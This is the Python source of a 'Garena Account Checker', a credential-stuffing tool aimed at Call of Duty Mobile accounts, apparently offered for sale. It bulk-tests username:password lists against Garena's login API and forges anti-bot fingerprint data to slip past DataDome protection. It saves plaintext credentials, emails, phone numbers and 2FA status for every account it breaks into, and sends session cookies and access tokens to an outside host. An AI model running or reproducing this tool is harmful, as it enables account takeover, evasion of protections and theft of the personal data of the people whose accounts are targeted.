import os
import sys
import re
import time
import json
import uuid
import base64
import hashlib
import random
import logging
import urllib
import platform
import subprocess
import requests
import html
from tqdm import tqdm
from colorama import Fore, Style, init
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode
from Crypto.Cipher import AES
import change_cookie
init(autoreset=True)

RED = "\033[31m"
RESET = "\033[0m"
BOLD = "\033[1;37m"  
GREEN = "\033[32m"       
apkrov = "https://auth.garena.com/api/login?"
redrov = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"

datenok = str(int(time.time()))

class CookieRotator:
    def __init__(self):
        self.cookie_pool = []
        self.current_index = 0
        self.last_rotation = 0
        self.rotation_interval = 5  # Rotate cookies every 5 accounts
        
    def add_cookie(self, cookie):
        self.cookie_pool.append(cookie)
        
    def get_cookie(self):
        if not self.cookie_pool:
            return None
            
        if time.time() - self.last_rotation > 60 or self.current_index >= len(self.cookie_pool):
            self.current_index = 0
            self.last_rotation = time.time()
            
        cookie = self.cookie_pool[self.current_index]
        self.current_index += 1
        return cookie
        
    def rotate_cookies(self):
        """Force rotation of cookies"""
        self.current_index = (self.current_index + 1) % len(self.cookie_pool)
        return self.cookie_pool[self.current_index]

# Initialize cookie rotator
cookie_rotator = CookieRotator()

def strip_ansi_codes_jarell(text):
    ansi_escape_jarell = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')
    return ansi_escape_jarell.sub('', text)    

def get_datenow():
    return datenok
    
def generate_md5_hash(password):
    md5_hash = hashlib.md5()
    md5_hash.update(password.encode('utf-8'))
    return md5_hash.hexdigest()

def generate_decryption_key(password_md5, v1, v2):
    intermediate_hash = hashlib.sha256((password_md5 + v1).encode()).hexdigest()
    decryption_key = hashlib.sha256((intermediate_hash + v2).encode()).hexdigest()
    return decryption_key

def encrypt_aes_256_ecb(plaintext, key):
    cipher = AES.new(bytes.fromhex(key), AES.MODE_ECB)
    plaintext_bytes = bytes.fromhex(plaintext)
    padding_length = 16 - len(plaintext_bytes) % 16
    plaintext_bytes += bytes([padding_length]) * padding_length
    chiper_raw = cipher.encrypt(plaintext_bytes)
    return chiper_raw.hex()[:32]  # Return a hex string of the first 32 bytes
    
def getpass(password, v1, v2):
    password_md5 = generate_md5_hash(password)
    decryption_key = generate_decryption_key(password_md5, v1, v2)
    encrypted_password = encrypt_aes_256_ecb(password_md5, decryption_key)
    return encrypted_password
    
def get_datadome_cookie():
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }
    
    payload = {
        'jsData': json.dumps({
            "ttst":76.70000004768372,"ifov":False,"hc":4,"br_oh":824,"br_ow":1536,"ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36","wbd":False,"dp0":True,"tagpu":5.738121195951787,"wdif":False,"wdifrm":False,"npmtm":False,"br_h":738,"br_w":260,"isf":False,"nddc":1,"rs_h":864,"rs_w":1536,"rs_cd":24,"phe":False,"nm":False,"jsf":False,"lg":"en-US","pr":1.25,"ars_h":824,"ars_w":1536,"tz":-480,"str_ss":True,"str_ls":True,"str_idb":True,"str_odb":False,"plgod":False,"plg":5,"plgne":True,"plgre":True,"plgof":False,"plggt":False,"pltod":False,"hcovdr":False,"hcovdr2":False,"plovdr":False,"plovdr2":False,"ftsovdr":False,"ftsovdr2":False,"lb":False,"eva":33,"lo":False,"ts_mtp":0,"ts_tec":False,"ts_tsa":False,"vnd":"Google Inc.","bid":"NA","mmt":"application/pdf,text/pdf","plu":"PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF","hdn":False,"awe":False,"geb":False,"dat":False,"med":"defined","aco":"probably","acots":False,"acmp":"probably","acmpts":True,"acw":"probably","acwts":False,"acma":"maybe","acmats":False,"acaa":"probably","acaats":True,"ac3":"","ac3ts":False,"acf":"probably","acfts":False,"acmp4":"maybe","acmp4ts":False,"acmp3":"probably","acmp3ts":False,"acwm":"maybe","acwmts":False,"ocpt":False,"vco":"","vcots":False,"vch":"probably","vchts":True,"vcw":"probably","vcwts":True,"vc3":"maybe","vc3ts":False,"vcmp":"","vcmpts":False,"vcq":"maybe","vcqts":False,"vc1":"probably","vc1ts":True,"dvm":8,"sqt":False,"so":"landscape-primary","bda":False,"wdw":True,"prm":True,"tzp":True,"cvs":True,"usb":True,"cap":True,"tbf":False,"lgs":True,"tpd":True
        }),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }

    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())

    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()
        response_json = response.json()
        
        if response_json['status'] == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            datadome = cookie_string.split(';')[0].split('=')[1]
            return datadome
        else:
            print(f"DataDome cookie not found in response. Status code: {response_json['status']}")
            print(f"Response content: {response.text[:200]}...")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Error getting DataDome cookie: {e}")
        return None

def check_login(account_username, _id, encryptedpassword, password, selected_header, cookies, dataa, date):
    cookies["datadome"] = dataa
    
    # Rotate cookies before making the request
    rotated_cookies = cookie_rotator.rotate_cookies()
    if rotated_cookies:
        cookies.update(rotated_cookies)
    
    login_params = {
        'app_id': '100082',
        'account': account_username,
        'password': encryptedpassword,
        'redirect_uri': redrov,
        'format': 'json',
        'id': _id,
    }
    login_url = apkrov + f"{urlencode(login_params)}"
    
    try:
        response = requests.get(login_url, headers=selected_header, cookies=cookies, timeout=60)
        response.raise_for_status()
    except requests.exceptions.ConnectionError:
        print("[🔴] ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴇʀʀᴏʀ – sᴇʀᴠᴇʀ ʀᴇғᴜsᴇᴅ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ")
        return "FAILED"
    except requests.exceptions.ReadTimeout:
        print("[⏱️] Timeout - Server is taking too long to respond")
        return "FAILED"
    except requests.RequestException as e:
        print(f"[⚠️] ʟᴏɢɪɴ ʀᴇǫᴜᴇsᴛ ғᴀɪʟᴇᴅ: {e}")
        return "FAILED"
        
    try:
        login_json_response = response.json()
    except json.JSONDecodeError:
        print(f"[💢] ʟᴏɢɪɴ ғᴀɪʟᴇᴅ: ɪɴᴠᴀʟɪᴅ ᴊsᴏɴ ʀᴇsᴘᴏɴsᴇ. sᴇʀᴠᴇʀ ʀᴇsᴘᴏɴsᴇ: {response.text}")
        return "FAILED"

    if 'error_auth' in login_json_response:
        return "[🔐] ɪɴᴄᴏʀʀᴇᴄᴛ ᴘᴀssᴡᴏʀᴅ"
    
    if 'error_params' in login_json_response:
        return "[📝] ɪɴᴠᴀʟɪᴅ ᴘᴀʀᴀᴍᴇᴛᴇʀs"
    
    if 'error' in login_json_response:
        return f"[🚫] ɪɴᴄᴏʀʀᴇᴄᴛ ᴘᴀssᴡᴏʀᴅ"
    
    if not login_json_response.get('success', True):
        return "[🔴] ʟᴏɢɪɴ ғᴀɪʟᴇᴅ"    
   
    session_key = login_json_response.get('session_key', '')
    take = cookies["datadome"]
    if not session_key:
        return "[FAILED] No session key"

    set_cookie = response.headers.get('Set-Cookie', '')
    sso_key = set_cookie.split('=')[1].split(';')[0] if '=' in set_cookie else ''       
    coke = change_cookie.get_cookies()
    coke["ac_session"] = "7tdtotax7wqldao9chxtp30tn4m3ggkr"
    coke["datadome"] = take
    coke["sso_key"] = sso_key

    hider = {
        'Host': 'account.garena.com',
        'Connection': 'keep-alive',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        'sec-ch-ua-mobile': '?1',
        'User-Agent': selected_header["User-Agent"],
        'Accept': 'application/json, text/plain, */*',
        'Referer': f'https://account.garena.com/?session_key={session_key}',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    init_url = 'https://suneoxjarell.x10.bz/jajak.php'
    params = {f'coke_{k}': v for k, v in coke.items()}
    params.update({f'hider_{k}': v for k, v in hider.items()})

    try:
        init_response = requests.get(init_url, params=params, timeout=120)
        init_response.raise_for_status()
    except requests.RequestException as e:
        return f"[ERROR] Init Request Failed: {e}"

    try:
        init_json_response = json.loads(init_response.text)
    except json.JSONDecodeError:
        return "[ERROR] Failed to parse JSON response from server."

    if 'error' in init_json_response or not init_json_response.get('success', True):
        return f"[ERROR] {init_json_response.get('error', 'Unknown error')}"

    bindings = init_json_response.get('bindings', [])
    is_clean = init_json_response.get('status')  # Get status from response

    account_status = init_json_response.get('status', 'Unknown')
    country = "N/A"
    last_login = "N/A"
    last_login_where = "N/A"
    avatar_url = "N/A"
    fb = "N/A"
    eta = "N/A"
    fbl = "N/A"
    mobile = "N/A"
    facebook = "False"
    shell = "0"
    count = "UNKNOWN"
    ipk = "1.1.1.1"    
    region = "IN.TH"
    email = "N/A"
    ipc = "N/A"
    mb = "mb"
    tae = "GS1.1.1741519354.3.0.1741519361.0.0.0"
    mspid2 = "2990f10cf751cf937dcb2b257767d582"
    email_verified = "False"
    authenticator_enabled = False
    two_step_enabled = False

    for binding in bindings:
        if "Country:" in binding:
            country = binding.split("Country:")[-1].strip()
        elif "LastLogin:" in binding:
            last_login = binding.split("LastLogin:")[-1].strip()       
        elif "LastLoginFrom:" in binding:
            last_login_where = binding.split("LastLoginFrom:")[-1].strip()            
        elif "ckz:" in binding:
            count = binding.split("ckz:")[-1].strip()       
        elif "LastLoginIP:" in binding:
            ipk = binding.split("LastLoginIP:")[-1].strip()                                      
        elif "Las:" in binding:
            ipc = binding.split("Las:")[-1].strip()                                    
        elif "Garena Shells:" in binding:
            shell = binding.split("Garena Shells:")[-1].strip()
        elif "Facebook Account:" in binding:
            fb = binding.split("Facebook Account:")[-1].strip()
            facebook = "True"
        elif "Fb link:" in binding:
            fbl = binding.split("Fb link:")[-1].strip()
        elif "Avatar:" in binding:
            avatar_url = binding.split("Avatar:")[-1].strip()
        elif "Mobile Number:" in binding:
            mobile = binding.split("Mobile Number:")[-1].strip()                  
        elif "tae:" in binding:
            email_verified = "True" if "Yes" in binding else "False"
        elif "eta:" in binding:
            email = binding.split("eta:")[-1].strip()
        elif "Authenticator:" in binding:
            authenticator_enabled = "True" if "Enabled" in binding else "False"
        elif "Two-Step Verification:" in binding:
            two_step_enabled = "True" if "Enabled" in binding else "False"

    cookies["sso_key"] = sso_key            
    head = {
    "Host": "auth.garena.com",
    "Connection": "keep-alive",
    "Content-Length": "107",
    "sec-ch-ua": '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    "Accept": "application/json, text/plain, */*",
    "sec-ch-ua-platform": selected_header["sec-ch-ua-platform"],
    "sec-ch-ua-mobile": "?1",
    "User-Agent": selected_header["User-Agent"],
    "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
    "Origin": "https://auth.garena.com",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9"
    }               
    data = {
        "client_id": "100082",
        "response_type": "token",
        "redirect_uri": "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/",
        "format": "json",
        "id": _id
    }            
    try:     
        grant_url = "https://auth.garena.com/oauth/token/grant"        
        reso = requests.post(grant_url, headers=head, data=data, cookies=cookies)   
        if not reso:
            return "[FAILED] No response from server."       
        try:
            data = reso.json()
        except ValueError:
            return "Failed to parse response as JSON."                    
        if "error" in data:            
            return f"[FAILED] {data['error']}"
        else:
            if "access_token" in data:
                newdate = get_datadome_cookie()
                
                token_session = reso.cookies.get('token_session', cookies.get('token_session'))                                               
                access_token = data["access_token"]
                tae = show_level(access_token, selected_header,sso_key,token_session, newdate, cookies)                    
                if "[😵‍💫]" in tae:
                    return tae + "FAILED, UNKNOWN ERROR"
                
                codm_nickname, codm_level, codm_region, uid = tae.split("|")
   
                connected_games = []

                if not (uid and codm_nickname and codm_level and codm_region):
                    connected_games.append("No CODM account found")
                else:
                    connected_games.append(f"[📊] Account Level: {codm_level}\n[🕹️] Game: CODM ({codm_region})\n[🏷️] Nickname: {codm_nickname}\n[🆔] UID: {uid}")
                
                if is_clean == "\033[0;32m\033[1mClean\033[0m":
                    is_clean = True
                else:
                    is_clean = False 
                    
                passed = format_result(last_login, last_login_where, country, shell, avatar_url, mobile, facebook, email_verified, authenticator_enabled, two_step_enabled, connected_games, is_clean, fb, fbl, email, date, account_username, password, count, ipk, ipc)    
                return passed                                                                                                                              
            else:
                return f"[FAILED] 'access_token' not found in response {data}"               
    except requests.RequestException as e:
        return f"[FAILED] {e}"

def show_level(access_token, selected_header, sso, token, newdate, cookie):
    url = "https://auth.codm.garena.com/auth/auth/callback_n"
    params = {
        "site": "https://api-delete-request.codm.garena.co.id/oauth/callback/",
        "access_token": access_token
    }

    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://auth.garena.com/",
        "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-site",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": selected_header["User-Agent"]
    }
    newdate = get_datadome_cookie()
    
    cookie.update({
        "datadome": newdate,
        "sso_key": sso,
        "token_session": token
    })

    response = requests.get(url, headers=headers, cookies=cookie, params=params)

    if response.status_code == 200:
        parsed_url = urlparse(response.url)
        query_params = parse_qs(parsed_url.query)
        extracted_token = query_params.get("token", [None])[0]

        data = {
        "selected_header": selected_header,
        "extracted_token": extracted_token
        }
    
        try:
            response = requests.post(
                "https://suneoxjarell.x10.bz/jajac.php",
                json=data,
                headers={"Content-Type": "application/json"}
            )
        
            if response.status_code == 200:
                return response.text
            else:
                return f"[FAILED] {response.status_code} - {response.text}"
    
        except requests.exceptions.RequestException as e:
            return f"[FAILED] {str(e)}"
    else:
        return f"[FAILED] {response.text}"

def format_result(last_login, last_login_where, country, shell, avatar_url, mobile, facebook, email_verified, authenticator_enabled, two_step_enabled, connected_games, is_clean, fb, fbl, email, date, username, password, count, ipk, ipc):       
    clean_status = "Clean" if is_clean else "Not Clean"
    fbl = "N/A" if fb == "N/A" else fbl
    email_ver = "Not Verified" if email_verified == "False" else "Verified"
    jk = strip_ansi_codes_jarell(shell)
    avatar_urls = html.escape(avatar_url)
  
    mess = f"""
{Fore.GREEN}[✅] Login Successful{Style.RESET_ALL}  
{Fore.GREEN}[🆔] Account: {Fore.CYAN}{username}:{password}{Style.RESET_ALL}  
{Fore.GREEN}[📅] Last Login: {Fore.YELLOW}{last_login}{Style.RESET_ALL}  
{Fore.GREEN}[🌐] Last login from: {Fore.YELLOW}{last_login_where}{Style.RESET_ALL}  
{Fore.GREEN}[🔍] Last login IP: {Fore.YELLOW}{ipk}{Style.RESET_ALL}  
{Fore.GREEN}[🗺️] Last login country: {Fore.YELLOW}{ipc}{Style.RESET_ALL}  
{Fore.GREEN}[🏳️] Country: {Fore.CYAN}{country}{Style.RESET_ALL}  
{Fore.GREEN}[🐚] Shells: {Fore.RED if shell == 0 else Fore.GREEN}{shell}{Style.RESET_ALL}  
{Fore.GREEN}[🖼️] Avatar: {avatar_url}{Style.RESET_ALL}  
{Fore.GREEN}[📱] Mobile No: {Fore.CYAN}{mobile}{Style.RESET_ALL}  
{Fore.GREEN}[📧] Email: {Fore.CYAN}{email} ({email_ver}){Style.RESET_ALL}  
{Fore.GREEN}[👤] Facebook Username: {Fore.CYAN}{fb}{Style.RESET_ALL}  
{Fore.GREEN}[🔗] Facebook Link: {Fore.CYAN}{fbl} {Style.RESET_ALL}  

{Fore.GREEN}[🎮] Codm Info  
{("".join(connected_games) if connected_games else "No Games Found")}

{Fore.GREEN}[📌] Bind Status:  
{Fore.GREEN}[📱] Mobile binded: {Fore.YELLOW if mobile != "N/A" else Fore.RED}{mobile != "N/A"}{Style.RESET_ALL}  
{Fore.GREEN}[✅] Email verified: {Fore.YELLOW if email_verified else Fore.RED}{email_verified}{Style.RESET_ALL}  
{Fore.GREEN}[🔗] Facebook Linked: {Fore.CYAN}{facebook}{Style.RESET_ALL}  
{Fore.GREEN}[🔐] Authenticator: {Fore.CYAN}{authenticator_enabled}{Style.RESET_ALL}  
{Fore.GREEN}[🛡️] 2FA: {Fore.CYAN}{two_step_enabled}{Style.RESET_ALL}  

{Fore.GREEN}[⚙️] Account Status: {Fore.YELLOW}{clean_status}{Style.RESET_ALL}

{Fore.YELLOW}[🛠️] 𝐏𝐫𝐞𝐬𝐞𝐧𝐭𝐞𝐝 𝐁𝐲: @Mendez10 Pinaka pogi😝 {Style.RESET_ALL}
""".strip()

    output_dir = "output"   
    os.makedirs(output_dir, exist_ok=True)

    clean_file = os.path.join(output_dir, f"clean_{date}.txt")
    notclean_file = os.path.join(output_dir, f"notclean_{date}.txt")

    file_to_save = clean_file if is_clean else notclean_file
    resalt = strip_ansi_codes_jarell(mess)
    with open(file_to_save, "a", encoding="utf-8") as f:
        f.write(resalt + "\n" + "-" * 50 + "\n")
        
    return mess
    
def get_request_data():
    cookies = change_cookie.get_cookies()
    
    # Add cookies to the rotator pool
    cookie_rotator.add_cookie(cookies)
    
    headers = {
        'Host': 'auth.garena.com',
        'Connection': 'keep-alive',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        'sec-ch-ua-mobile': '?1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua-platform': '"Android"',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.9'
    }

    return cookies, headers

def check_account(username, password, date):
    try:
        base_num = "17290585"
        random_id = base_num + str(random.randint(10000, 99999))
        cookies, headers = get_request_data()
        params = {
            "app_id": "100082",
            "account": username,
            "format": "json",
            "id": random_id
        }
        login_url = "https://auth.garena.com/api/prelogin"
        response = requests.get(login_url, params=params, cookies=cookies, headers=headers)
        
        if "captcha" in response.text.lower():
            print(f"{RED}[🔴 𝐒𝐓𝐎𝐏] CAPTCHA detected. Please change your VPN or IP and enter again.{RESET}")
            input("🆘 ᴘʟᴇᴀsᴇ ᴄʜᴀɴɢᴇ ʏᴏᴜʀ ᴠᴘɴ ᴏʀ ɪᴘ ᴀɴᴅ ᴘʀᴇss ᴇɴᴛᴇʀ ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ...")
            return "[🔴 𝐒𝐓𝐎𝐏] ᴄᴀᴘᴛᴄʜᴀ ᴅᴇᴛᴇᴄᴛᴇᴅ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ ."

        if response.status_code == 200:
            data = response.json()
            v1 = data.get('v1')
            v2 = data.get('v2')
            prelogin_id = data.get('id')

            if not all([v1, v2, prelogin_id]):
                return f"[😢] 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗗𝗜𝗗𝗡'𝗧 𝗘𝗫𝗜𝗦𝗧"            
            new_datadome = response.cookies.get('datadome', cookies.get('datadome'))           
            encrypted_password = getpass(password, v1, v2)
            if not new_datadome:
                return f"[FAILED] Status: Missing updated cookies"            
            if "error" in data or data.get("error_code"):
                return f"[FAILED] Status: {data.get('error', 'Unknown error')}"
            else:
                    tre = check_login(username, random_id, encrypted_password, password, headers, cookies, new_datadome, date)  
                    return tre
        else:
            return f"[FAILED] HTTP Status: {response.status_code}"

    except Exception as e:
        return f"[FAILED] {e}"
        
def bulk_check(file_path):
    successful_count = 0
    failed_count = 0
    checked_count = 0
    date = get_datenow()

    if not file_path.endswith('.txt'):
        print("🔴: Invalid file format. Please provide a .txt file.")
        return    

    output_dir = "output"
    os.makedirs(output_dir, exist_ok=True)  

    failed_file = os.path.join(output_dir, f"failed_{date}.txt")
    success_file = os.path.join(output_dir, f"valid_{date}.txt")

    print(f"\n{Fore.GREEN}⚙️ Processing: {file_path}{Style.RESET_ALL}")

    try:
        # First pass: Filter valid accounts
        valid_accounts = []
        with open(file_path, 'r', encoding='utf-8') as infile:
            for line in infile:
                line = line.strip()
                if line and ':' in line:
                    parts = line.split(':', 1)
                    if len(parts) == 2 and parts[0] and parts[1]:
                        valid_accounts.append((parts[0].strip(), parts[1].strip()))

        total_accounts = len(valid_accounts)
        print(f"{Fore.CYAN}📊 Total valid accounts: {total_accounts}{Style.RESET_ALL}\n")

        # Second pass: Process accounts
        with open(failed_file, 'a', encoding='utf-8') as failed_out, \
             open(success_file, 'a', encoding='utf-8') as success_out:

            for username, password in valid_accounts:
                checked_count += 1
                print(f"\r{Fore.YELLOW}🔍 Checking: {checked_count}/{total_accounts} | Failed: {failed_count} | Success: {successful_count} {Style.RESET_ALL}", end="", flush=True)
                
                result = check_account(username, password, date)
                
                if "[✅]" in result:
                    successful_count += 1
                    success_out.write(f"{username}:{password}\n")
                    print(f"\n{Fore.GREEN}✅ SUCCESS: {username}:{password}\n{result}{Style.RESET_ALL}")
                else:
                    failed_count += 1
                    failed_out.write(f"{username}:{password} | {result}\n")
                    print(f"\n{Fore.RED}❌ FAILED:{username}:{password}\n{result}{Style.RESET_ALL}")

    except Exception as e:
        print(f"\n{Fore.RED}⚠ ERROR: {e}{Style.RESET_ALL}")
    finally:
        print(f"\n{Fore.GREEN}📊 Final Results:")
        print(f"✔ Checked: {checked_count}/{total_accounts}")
        print(f"✔ Success: {successful_count}")
        print(f"✖ Failed: {failed_count}")
        print(f"\n💾 Saved to:")
        print(f"- Success: {success_file}")
        print(f"- Failed: {failed_file}{Style.RESET_ALL}")
    try:
        response = requests.get(url)
        response_text = response.text
        return response_text.strip()
    except requests.RequestException:
        return "NoNet"
        
    return False

def find_nearest_account_file():
    # Keywords to search for in filenames
    keywords = ["garena", "account", "codm"]
    
    # Walk through the current directory and subdirectories
    for root, _, files in os.walk(os.getcwd()):
        for file in files:
            if file.endswith(".txt") and any(keyword in file.lower() for keyword in keywords):
                return os.path.join(root, file)
    
    # If no matching file is found, use a default name in the current directory
    return os.path.join(os.getcwd(), "accounts.txt")

def taeee(jarell):
    display_banner()
    
    # Prompt for file path in a synchronous context
    file_path = input("Enter the path of the .txt file (ex: /sdcard/Download/filename.txt) or press Enter to find the nearest relevant file: ").strip()
    if not file_path:
        file_path = find_nearest_account_file()  # Find the nearest matching .txt file if no input is provided
    
    # Check if the provided path is a .txt file and exists
    if not file_path.endswith('.txt') or not os.path.isfile(file_path):
        print("Invalid file path. Please provide a valid .txt file.")
        return
    
    # Wait for user to press Enter to start the bulk check
    input("Press Enter to start the bulk check...")

    # Call your bulk check function with the file path
    bulk_check(file_path)

def clear_screen():
    # Windows
    if os.name == 'nt':
        os.system('cls')
    # Mac and Linux
    else:
        os.system('clear')

def get_device_id():
    # Directory and file path for storing device ID
    dir_path = os.path.expanduser("~/.dont_delete_me")
    file_path = os.path.join(dir_path, "here.txt")  
    # Check if the file already exists
    if os.path.exists(file_path):
        # Read the existing device ID from the file
        with open(file_path, 'r') as file:
            device_id = file.read().strip()  # Strip any extra whitespace/newlines
    else:
        # Create the directory if it doesn't exist
        os.makedirs(dir_path, exist_ok=True)  # Ensure the directory is created
        
        # Prompt for user name
        user_name = input("Enter your name: ").strip()  # Get and strip user input

        # Collect various system details for generating a unique ID
        system_info = (
            platform.system(),         # OS type (e.g., Windows, Linux)
            platform.release(),        # OS version
            platform.version(),        # OS build version
            platform.machine(),        # Hardware type (e.g., x86_64)
            platform.processor(),      # Processor information
        )

        # Generate a consistent UUID from hardware properties
        hardware_id = "-".join(system_info)  # Combine system info into a single string
        unique_id = uuid.uuid5(uuid.NAMESPACE_DNS, hardware_id)  # Generate UUID based on system info

        # Hash the unique ID for consistency and uniqueness
        device_hash = hashlib.sha256(unique_id.bytes).hexdigest()  # Create a SHA-256 hash

        # Combine user input with a portion of the hash to form the device ID
        device_id = f"{user_name}_{device_hash[:8]}"  # User name + first 8 characters of hash for uniqueness

        # Write the generated device ID to the file
        with open(file_path, 'w') as file:
            file.write(device_id)  # Save the device ID
    
    return device_id  # Return the device ID

W = "\033[0m"          # Reset color
GR = "\033[90m"        # Grey text
R = "\033[1;31m"       # Red text
RED = "\033[101m"      # Red background
B = "\033[0;34m\033[1m" # Bold blue text

def display_banner():
    """Display the script banner"""
    banner = f"""
{R}╔════════════════════════════════════════════════╗
{R}║ {B}{R}Garena Account Checker {B}by {B}@Mendez10 {R} 
{R}║                V3 CODM CHECKER                    
{R}║ {R}Features:                                  {R}     
{R}║ {W}• Unlimited Account Checking              {R}    
{R}║ {W}• CODM Info Retrieval                    {R}      
{R}║ {W}• Auto CAPTCHA Handling                  {R}    
{R}║ {W}• Detailed Account Analysis               {R}
{R}║ {W}• Super Fast Checking                    {R}
{R}╚════════════════════════════════════════════════╝
{R}{W}{RED}{B}{W}{RED} Garena Bind Checker: by Mendez {B}{W}{R}\033[0m
{RESET}
"""
    print(banner)

def check_subscription(device_id):
    """Check subscription status for the device"""
    # This would typically call an API to check subscription
    # For demo purposes, we'll just return "info" to simulate active subscription
    return "info"

def main():
    try:
        display_banner()  # Display application banner
        device_id = get_device_id()  # Get or generate the device ID
        print(f"{BOLD}Your device ID:{RESET}{BOLD}\n{GREEN}{device_id}\033[0m")  # Display the device ID
        print(f"\n{BOLD}Send Screenshot to your seller to register your device\n")

        # Automatically check subscription status
        jarell = device_id.split('_')[0]
        
        while True:
            subscription_status = check_subscription(device_id)  # Check subscription using the device ID

            if subscription_status == "info":
                print(f"{BOLD}Account Registered!")  # Indicate successful registration
                time.sleep(0.5)  # Pause briefly
                taeee(jarell)  # Proceed to taeee() if Tor starts successfully
                break  # Exit loop if Tor start fails
                    

            elif subscription_status == "InternetIPCHANGED":
                print(f"{RED}NO INTERNET CONNECTION")  # Display no internet connection warning
                return "No internet"  # Return status indicating no internet
                break  # Exit loop
            else:
                print(f"{RED}Device currently doesn't have an active subscription. Retrying...")  # Warn about inactive subscription
                time.sleep(5)  # Wait before retrying the check
        
    except KeyboardInterrupt:
        print(f"\n{RED}Exiting program...{RESET}")
        sys.exit(0)  # Exit cleanly on Ctrl+C

if __name__ == "__main__":
    taeee("dez")